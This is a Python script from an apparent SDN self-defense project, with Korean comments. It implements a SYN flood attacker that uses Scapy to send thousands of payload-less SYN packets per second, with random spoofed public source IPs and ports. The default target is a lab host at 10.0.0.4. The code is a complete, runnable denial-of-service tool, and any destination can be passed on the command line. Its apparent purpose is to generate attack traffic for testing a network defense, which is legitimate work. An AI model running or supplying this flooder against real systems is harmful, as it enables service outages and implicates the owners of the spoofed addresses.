"""Self-Defending SDN Tower - H_attacker(10.0.0.2) -> H_server(10.0.0.4) 랜덤 IP 스푸핑 SYN Flood 공격기.

주간 계획: docs/guides/dev_b_domain_qa/week05_traffic_attack_implementation_plan.md
실행 예: sudo uv run python traffic/traffic_attack.py --dst 10.0.0.4 --dport 80
"""

from __future__ import annotations

import argparse
import random
import time
from dataclasses import dataclass
from typing import List

from scapy.layers.inet import IP, TCP
from scapy.packet import Packet
from scapy.sendrecv import send

try:
    from traffic.checksum_utils import finalize_checksum
except ImportError:  # `python traffic/traffic_attack.py`로 직접 실행될 때 (패키지 컨텍스트 없음)
    from checksum_utils import finalize_checksum  # type: ignore[no-redef]

# Ethernet 헤더(14B)는 send() 시 OS/드라이버가 부착하며 Scapy 객체 길이엔 포함되지 않는다.
WIRE_OVERHEAD = 14
PPS_RANGE = (1000, 5000)
SPORT_RANGE = (1024, 65535)


@dataclass
class AttackProfile:
    dst: str
    dport: int = 80


def _is_private_or_reserved(a: int, b: int) -> bool:
    if a == 10:
        return True
    if a == 172 and 16 <= b <= 31:
        return True
    if a == 192 and b == 168:
        return True
    if a == 127:
        return True
    if a == 169 and b == 254:
        return True
    return False


def random_public_ip() -> str:
    """1.0.0.0~223.255.255.255 범위에서 사설/예약 대역을 제외한 임의 IP를 생성한다."""
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        if _is_private_or_reserved(a, b):
            continue
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        return f"{a}.{b}.{c}.{d}"


def build_syn_packet(profile: AttackProfile) -> Packet:
    """출발지 IP/포트를 무작위 변조한 페이로드 없는 SYN 패킷 생성 (54~74B 극소형 패킷)."""
    sport = random.randint(*SPORT_RANGE)
    pkt = IP(src=random_public_ip(), dst=profile.dst) / TCP(sport=sport, dport=profile.dport, flags="S")
    return finalize_checksum(pkt)


def flood_second(profile: AttackProfile, pps: int, verbose: bool = False) -> int:
    """목표 PPS만큼 SYN 패킷을 생성해 한 번에 전송하고 전송 개수를 반환한다."""
    packets: List[Packet] = [build_syn_packet(profile) for _ in range(pps)]
    send(packets, verbose=verbose)
    return len(packets)


def run(
    profile: AttackProfile,
    duration: float,
    pps_range: tuple[int, int] = PPS_RANGE,
    verbose: bool = False,
) -> dict:
    """duration(초) 동안 매초 pps_range 내 무작위 목표치로 SYN Flood를 주입한다."""
    sent_total = 0
    rate_log: List[int] = []
    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        tick_start = time.monotonic()
        target_pps = random.randint(*pps_range)
        sent_total += flood_second(profile, target_pps, verbose=verbose)
        rate_log.append(target_pps)
        elapsed = time.monotonic() - tick_start
        if elapsed < 1.0:
            time.sleep(1.0 - elapsed)
    return {"sent": sent_total, "seconds": len(rate_log), "rate_log": rate_log}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="H_attacker -> H_server 랜덤 IP 스푸핑 SYN Flood 공격기")
    parser.add_argument("--dst", default="10.0.0.4", help="목적지 호스트 IP (H_server)")
    parser.add_argument("--dport", type=int, default=80, help="목적지 포트")
    parser.add_argument("--duration", type=float, default=10.0, help="총 실행 시간(초)")
    parser.add_argument("--min-pps", type=int, default=PPS_RANGE[0], help="초당 최소 패킷 수")
    parser.add_argument("--max-pps", type=int, default=PPS_RANGE[1], help="초당 최대 패킷 수")
    parser.add_argument("--verbose", action="store_true", help="Scapy 전송 로그 출력")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    profile = AttackProfile(dst=args.dst, dport=args.dport)
    result = run(profile, args.duration, (args.min_pps, args.max_pps), verbose=args.verbose)
    avg_pps = result["sent"] / result["seconds"] if result["seconds"] else 0
    print(f"[traffic_attack] 전송 완료: 총 {result['sent']}건, {result['seconds']}초간 평균 {avg_pps:.0f} PPS")


if __name__ == "__main__":
    main()
